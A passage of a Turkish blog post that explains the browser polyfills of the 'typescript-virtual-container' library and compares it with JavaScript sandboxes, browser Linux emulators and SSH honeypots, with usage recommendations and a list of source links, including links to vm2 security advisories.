Wasm kripto kütüphanesi içe aktarmak yerine kripto polyfilli FIPS 180-4 tur sabitlerini kullanarak SHA-256yı sıfırdan uygular. Tam hex/base64/Uint8Array çıktı destekli 166 satır saf JS. Kütüphanedeki tüm hashleme oradan geçer: SSH ana anahtar parmak izleri, dahili sağlama toplamları, hepsi. Kompakt, sıfır bağımlılık, çalışır.

**`node:os`: tarayıcının gerçek donanımını okur**

Bu hoş bir özen. Sabit kodlanmış sahte değerler döndürmek yerine `node:os`, toplam RAM için `navigator.deviceMemory` ve CPU sayısı için `navigator.hardwareConcurrency` okur. Yani tarayıcı derlemede `neofetch` aslında gerçek makinene karşılık gelen bir şeyi raporlar: sahte `2 çekirdek, 2 GB RAM` saplaması değil.

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // varsayılan 2 GB
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // CPU model dizesini tahmin etmek için navigator.userAgent de ayrıştırır
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`, `ssh2`, `roxify`: dürüst saplamalar**

Tarayıcı TCP soketleri açamaz ya da gerçek SSH çalıştıramaz, o yüzden bunlar bir şey onları kullanmaya çalışırsa açık mesajlı `NotImplemented` hatası fırlatan saplamalardır. Başarısızlıklar açık kalır, nesne beklenen yerde `undefined` döndürülmez. Sadece güçlü ve net "tarayıcıda çalışmaz" mesajı: ki bu tam istediğindir.

**`process.js` ve `buffer.js`: enjekte globaller**

Bu ikisi esbuild `inject` seçeneğiyle paketin her dosyasının üstüne enjekte edilir, o yüzden `process` ve `Buffer` açık içe aktarma olmadan global kullanılabilir. `process.js` miniciktir: `env`, `version`, `platform: 'browser'`, `queueMicrotask` üzerinden `nextTick`, `performance.now()` üzerinden `uptime`. `buffer.js`, `Uint8Array` üstünde `Buffer` eksiksiz yeniden uygulamasıdır: SSH uygulamasının ve VFSin bağlı olduğu tüm `readUInt32BE`, `writeInt16LE`, hex/base64 kodlamaları.

---

Tüm polyfiller toplamda yaklaşık 640 satır elle yazılmış JS tutar. npm paketi yok, Wasm yok. Ve sonuç sadece kütüphane olan, yerel dönen tarayıcı paketidir, Node-öncelikli tasarlanmış kütüphanelerdeki alışılmış "ama tarayıcıda gerçekten çalışır mı?" kaygısı hiç yok. Meraklıysan depodaki `polyfills/` klasörüne göz atmaya değer: her dosya iyi kapsüllenmiş ve kendi başına okunabilir, çok takdir ettiğim tarz seçimi.

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **Kategori** | JS Kum havuzu | JS Kum havuzu | JS Kum havuzu | Emülatör | Emülatör | Node.js/Wasm | Honeypot | Simülatör |
| **JSyi izole eder** | ⚠️ kapsam | ✅ V8 Isolate | ✅ Wasm | uygulanamaz | uygulanamaz | kısmi | uygulanamaz | ✅ Worker |
| **Gerçek çekirdek** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **Kabuk yorumlayıcı** | ❌ | ❌ | ❌ | ✅ (gerçek) | ✅ (gerçek) | ✅ (gerçek) | kısmi | ✅ (özel) |
| **~170 Unix komutu** | ❌ | ❌ | ❌ | ✅ | ✅ | kısmi | ~20 | ✅ |
| **POSIX izinleri** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | kısmi | ✅ uygulanır |
| **Kullanıcı yönetimi** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | minimal | ✅ eksiksiz |
| **Gerçek SSH sunucusu** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Honeypot/denetim** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **VFS Diff/anlık görüntü** | ❌ | ❌ | ❌ | sınırlı | ❌ | ❌ | ❌ | ✅ |
| **L2/L3 sanal ağ** | ❌ | ❌ | ❌ | temel | ❌ | ❌ | ❌ | ✅ eksiksiz |
| **Sanal VPN** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Tarayıcı desteği** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Yerel Node.js** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **Tipli API** | temel | ✅ | ✅ | minimal | ❌ | ✅ | ❌ | ✅ eksiksiz |
| **İkili uyumluluk** | uygulanamaz | uygulanamaz | uygulanamaz | ✅ | ✅ | kısmi | uygulanamaz | ❌ |
| **Başlatma süresi** | anlık | anlık | anlık | 15-40 sn | 15-40 sn | 2-5 sn | anlık | <1 sn |
| **RAM/örnek** | ~1 MB | ~3-10 MB | ~5-15 MB | 150-256 MB | 200+ MB | ~100 MB | ~50 MB | ~5-20 MB |
| **Çalışma bağımlılıkları** | 0 | 1 (yerel) | 1 (Wasm) | 0 | sahipli | 1 | Python bağımlılıkları | 3 (ssh2, ws, fflate) |
| **Durum** | kararlı | ✅ aktif | ✅ aktif | ✅ çok aktif | ticari | ✅ aktif | ✅ aktif | ✅ aktif |

---

## Ne zaman ne kullanılmalı

**Güvenilmez JavaScript çalıştırmalısın: kullanıcıca gönderilen formül, eklenti, script kancası.**
→ `isolated-vm`. Gerçek V8 Isolate, sıkı bellek limitleri, açık iletişim köprüsü. `vm2`den kaçın: CVE listesi uzamaya devam eder, cidden birkaç ayda bir yeni. `vm`den kaçın: bu hiç kum havuzu değil, lütfen.

**JSyi izole etmelisin ve yerel uzantı istemiyorsun ya da tarayıcı uyumluluğu gerekir.**
→ `quickjs-emscripten`. Wasm sınırı, ~500 KB modül, tarayıcı ve Nodeda çalışır. V8den yavaş ama gerçekten izole.

**Değiştirilmemiş gerçek Linux işletim sistemi başlatmalısın, ikili uyumlulukla.**
→ 32-bit Linux için `v86` ya da mevcut Docker imajın varsa `container2wasm`. 150+ MB RAM ve 30 saniye başlatmayı kabul et, anlaşma bu. 64-bit gerekirse CheerpXe bak ya da sadece gerçek konteyner çalışma ortamı kullan.

**Web uygulamasına backendsiz Linux benzeri terminal gömmelisin.**
→ `v86` (tam işletim sistemi, ağır, yavaş başlar) ya da `typescript-virtual-container` tarayıcı paketi (simülatör, daha hafif, anlık başlar, tam masaüstü için `startxfce4` içerir ki bu epey havalı).

**Çevrimiçi etkileşimli kodlama öğreticileri ya da tarayıcı IDE gerekir.**
→ Node.js ekosistemine odaklıysan WebContainers. Gerçek Linux kullanıcı alanı gerekirse CheerpX. Tipli APIli daha hafif seçenek istersen `typescript-virtual-container` tarayıcı paketi.

**SSH saldırgan TTPlerini büyük ölçekte toplamak istiyorsun.**
→ Cowrie üretim standardıdır, nokta. Herhangi Linux sunucuda döner, tüm SIEMlerle bütünleşir, artık LLM modu vardır. Sadece Cowrie kullan.

**Programlanabilir APIli Node.js uygulamasında SSH honeypot verileri istiyorsun.**
→ `typescript-virtual-container`. Komutlar gerçekten çalışır. VFS anında yakalayıp karşılaştırabileceğin gerçek veri yapısıdır. Saldırgan ikna edici etkileşimli ortam alır ve sen Node çıkmadan yapılandırılmış denetim verileri alırsın.

**Dockersız CI otomasyon kabuğu / testleri gerekir.**
→ `typescript-virtual-container`. Bir saniyeden kısa başlar, testten önce anlık görüntü al, sonra geri yükle. Tipli API ile kabuk komutları çalıştır. Docker daemonu yok, çekirdek yok, VM yok, bekleme yok.

**Çok kiracılı kabuk ortamları gerekir (SaaS, eğitim, öğretim).**
→ `typescript-virtual-container`. Örnek başına 5-20 MB ve emülatör için 150-256 MB karşılaştırması. 100 eşzamanlı kullanıcı: ~2 GB ve ~25 GB karşılaştırması. Barındırma maliyetlerinde büyük fark!

**Çok VMli ağ laboratuvarı da kurmaya izin veren gerçekçi honeypot gerekir.**
→ `typescript-virtual-container`, bu alanda ikisini de yapan tek şeydir.

---

## Yapamadığı şey (ve burada dürüst olmak isterim)

Yerel x86 ikilileri çalıştıramaz. C kodu derlemen, gerçek Python yorumlayıcı çalıştırman ya da Linux için derlenmiş yazılım kullanman gerekirse bu sistem çağrılarını destekleyecek çekirdek ABI yoktur. `gcc`, `python3` ve `node` gibi komutlar saplamadır: `--version` ve yaygın çağrılara yanıt verir ama gerçek bir şey çalıştırmaz.

Bu temel takastır: 10 ila 50 kat az bellek, anlık başlatma, tarayıcı uyumluluğu, tipli API, gerçek SSH ve sanal ağ kazanırsın ve Linux kullanıcı alanıyla ikili uyumluluktan vazgeçersin.

Fortune projeyi tasarlarken bunu çok düşündü. Hedeflediği kullanım durumları için: honeypotlar, testler, gömülü terminaller, CI ortamları, derlenmiş ikili çalıştırmak aslında hiç gerekli değildir. Kabuk pipeları, dosya manipülasyonu, ağ yönlendirme ve SSH her şeyi kapsar. Ama kullanım durumun gerçek derlenmiş yazılım gerektiriyorsa `v86` ya da Docker doğru yanıttır, bu değil.

---

## Sonuç olarak

İşte böyle. Bu ekosistem dışarıdan göründüğünden daha geniş ve daha parçalıdır. `vm` kapsam ayırıcıdır, kum havuzu değil. `vm2` CVE biriktirmeye devam eder (gerçekten, bu ayki uyarılara bak). `isolated-vm` JS izolasyonu için doğru yanıttır ama yalnızca JS. `quickjs-emscripten`, tarayıcı uyumluluğu gerekince ya da yerel uzantılardan kaçınmak isteyince doğru seçimdir. `v86` ve CheerpX gerçek ikili uyumluluk gerekince gerçek emülatörlerdir. WebContainers Wasmde Node.jsdir, genel Linux ortamı değil. Cowrie SSH honeypotlarının altın standardıdır ama Python ve yerel Node değildir.

Ve sonra biraz kendi kategorisinde yaşayan Fortune projesi `typescript-virtual-container` vardır. Ne emülatör, ne JS kum havuzu, ne pasif honeypot. Arada bir şey ve diğerlerinin hiçbirinin yapamadığı birçok şey için şaşırtıcı faydalı olduğu ortaya çıktı.

`typescript-virtual-container`, diğerlerinin hiçbirinin dokunmadığı boşluğu doldurur: gerçek SSH, SFTP, POSIX izinleri, kullanıcı yönetimi, sanal ağ ve tipli TypeScript APIli tam programlanabilir Linux kabuk ortamı: yaklaşık 10 MB içinde döner, bir saniyeden kısa başlar, hem Node.js hem tarayıcıda çalışır.

Denemek istersen: kaynak kodu [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) adresindedir ve çevrimiçi demo (tam masaüstü için `startxfce4` dahil ki bu düpedüz hastadır) [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo) adresindedir. Göz at ve GitHubda Fortunea birkaç yıldız bırak, hak eder!

Okuduğun için teşekkürler: bu standartlarıma göre bile uzundu :) umarım faydalı olmuştur!

---

## Kaynaklar

Her iddiayı birincil kaynağa bağlamaya çalıştım: CVE uyarıları, resmi belgeler, GitHub depoları, bakıcıların blog yazıları. Birkaç not: vm2 CVE listesi uzamaya devam eder o yüzden bunu okuduğunda FortiGuard bağlantısı eskimiş olabilir (en güncel için GitHub uyarı sayfasına bak). Bellard bağlantıları hep kararlıdır: kişisel sitesi hep oradadır ve içerik değişmez. Ve polyfillerin birine derinleşmek istersen depoda `polyfills/` klasörüne doğrudan göz atman yeter: burada yazabileceğim herhangi açıklamadan daha okunurdur.

### JavaScript kum havuzları

- **Node.js `vm` modülü**: resmi belgeleme: [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Node.js `vm` güvenlik uyarısı**: "vm modülü bir güvenlik mekanizması değildir. Güvenilmez kod çalıştırmak için kullanmayın": [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- **`vm2`**: npm: [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub: [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **vm2 CVE kronolojisi**: tüm CVE ve tarihli FortiGuard Uyarısı: [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017**: asenkron hatayla kaçış, GHSA: [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314**: Proxy + Error.name + Function kaçışı, gist PoC: [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466**: PoC eksiksiz Exploit DB girdisi: [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **2026 vm2 CVE**: 11 yeni kaçış, analiz: [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer: [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **"Why Sandboxing JS in JS is Hard"**: CVE-2022-36067 üzerine oxeye.io ölüm sonrası: [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`**: npm: [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub: [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **V8 Isolate içselleri**: Gömme Kılavuzu: [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`**: npm: [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub: [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`**: npm: [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub: [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **QuickJS motoru**: Fabrice Bellard imzalı: [bellard.org/quickjs](https://bellard.org/quickjs/)
- **Deno izin modeli**: belgeler: [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Deno 2 çıkışı**: Ekim 2024: [deno.com/blog/v2](https://deno.com/blog/v2)
- **TC39 ShadowRealm önerisi**: [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **TC39 Compartments önerisi**: [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **"Sandboxing JavaScript Code"**: Andrew Healeyden Deno kum havuzu yaklaşımına pratik makale: [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Linux emülatörleri

- **`v86`**: npm: [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub: [github.com/copy/v86](https://github.com/copy/v86) · Demo: [copy.sh/v86](https://copy.sh/v86)
- **v86 işletim sistemi destek matrisi**: [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS** (v86 kullandığı BIOS): [seabios.org](https://www.seabios.org/SeaBIOS)
- **Bochs VBE uzantıları** (VGA başvurusu): [bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux**: Bellard emülatörü: [bellard.org/jslinux](https://bellard.org/jslinux/) · Teknik notlar (TinyEMU, tarihçe, asm.js→Wasm): [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU**: C kaynağı: [bellard.org/tinyemu](https://bellard.org/tinyemu/) · Resmi olmayan GitHub aynaları: [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k**: JS OpenRISC emülatörü: [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · Demo: [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX**: belgeler: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · pthreads kılavuzu: [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers**: npm: [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · API Belgeleri: [webcontainers.io](https://webcontainers.io) · Duyuru: [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · InfoQ önizleme: [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm**: GitHub: [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · NTT blog yazısı: [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Simon Willison yazısı: [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### Terminal yığını

- **xterm.js**: npm: [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub: [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · site: [xtermjs.org](https://xtermjs.org)
- **node-pty**: npm: [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft): [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### Honeypotlar

- **Cowrie**: GitHub: [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · Belgeler: [docs.cowrie.org](https://docs.cowrie.org) · Site: [cowrie.org](https://www.cowrie.org/)
- **Kippo**: GitHub (arşivli): [github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh**: GitHub: [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame**: GitHub: [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird**: Docker Hub: [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot**: Minimal Node.js SSH Honeypotu: [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots**: Düzenlenmiş liste: [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082**: Sistem bilgisi keşfi (saldırganlar honeypotları nasıl tanımlar): [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm**: [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub**: [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **Çevrimiçi demo**: [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **Mimari kılavuz**: [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`** (SSH protokol uygulaması): npm: [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub: [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`** (VFS anlık görüntü sıkıştırma): npm: [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`** (WebSocket kabuk aktarımı): npm: [npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### İleri okumalar

- **POSIX izin modeli**: Open Group Şartnamesi: [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **Write-ahead logging** (VFS kalıcılığında kullanılan desen): [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **V8 Isolate modeli**: "Embedder's Guide": [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **RISC-V ISA Şartnamesi** (TinyEMU/JSLinux bağlamı için): [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **OpenRISC 1000 Mimarisi**: [opencores.org/or1k](https://opencores.org/or1k/)
- **"Running Python code in a Pyodide sandbox via Deno"**: Simon Willison TIL, Wasm yaklaşımıyla faydalı kontrast: [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **"Running self-hosted QuickJS in a browser"**: Simon Willison TIL, quickjs-emscripten paketi boyutu üzerine: [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
